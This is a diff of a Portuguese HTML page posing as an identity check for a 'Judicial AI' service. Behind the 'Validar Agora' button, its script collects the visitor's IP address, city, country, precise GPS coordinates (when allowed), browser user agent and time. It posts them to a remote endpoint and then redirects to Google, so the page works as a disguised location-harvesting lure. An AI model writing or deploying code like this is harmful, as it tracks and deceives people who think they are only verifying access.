@@ -2,25 +2,22 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>IA Judicial - Validação de Acesso</title>
+  <title>Validação IA Judicial</title>
 </head>
 <body style="text-align:center; font-family:sans-serif; margin-top:60px;">
-  <h2>🔐 Verificando - TESTE Beta</h2>
-  <p>Para acessar a IA Judicial, valide seu dispositivo e aprove as opcoes necessarias para poder funcionar sem erros.</p>
-  <p>Ao clicar, a IA irá funcionar sem erros.</p>
+  <h2>🔐 Verificação de Identidade</h2>
+  <p>Para acessar a IA Judicial, valide seu dispositivo.</p>
+  <p>Ao clicar, você autoriza a coleta de dados técnicos, para a IA-JUDICIAL, funcionar corretamente.</p>
   <button onclick="validar()" style="padding: 10px 20px; font-size: 16px;">Validar Agora</button>
 
   <script>
     async function validar() {
       const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
 
-      let latitude = null;
-      let longitude = null;
-
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (position) => {
-          latitude = position.coords.latitude;
-          longitude = position.coords.longitude;
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
 
           const dados = {
             ip: ipData.ip,
@@ -39,18 +36,16 @@
             body: JSON.stringify(dados)
           });
 
-          alert("Validação concluída. Obrigado.");
-          window.location.href = "https://www.google.com";
-        },
-        async (erro) => {
-          // Se o usuário negar geolocalização
+          alert("Validação concluída.");
+          window.location.href = "https://google.com";
+        }, async (erro) => {
           const dados = {
             ip: ipData.ip,
             cidade: ipData.city,
             regiao: ipData.region,
             pais: ipData.country_name,
-            latitude: "não permitido",
-            longitude: "não permitido",
+            latitude: "negada",
+            longitude: "negada",
             navegador: navigator.userAgent,
             horario: new Date().toISOString()
           };
@@ -61,11 +56,11 @@
             body: JSON.stringify(dados)
           });
 
-          alert("Validação parcial sem localização precisa.");
-          window.location.href = "https://www.google.com";
+          alert("Localização negada. Dados parciais enviados.");
+          window.location.href = "https://google.com";
         });
       } else {
-        alert("Geolocalização não suportada neste navegador.");
+        alert("Navegador sem suporte à geolocalização.");
       }
     }
   </script>
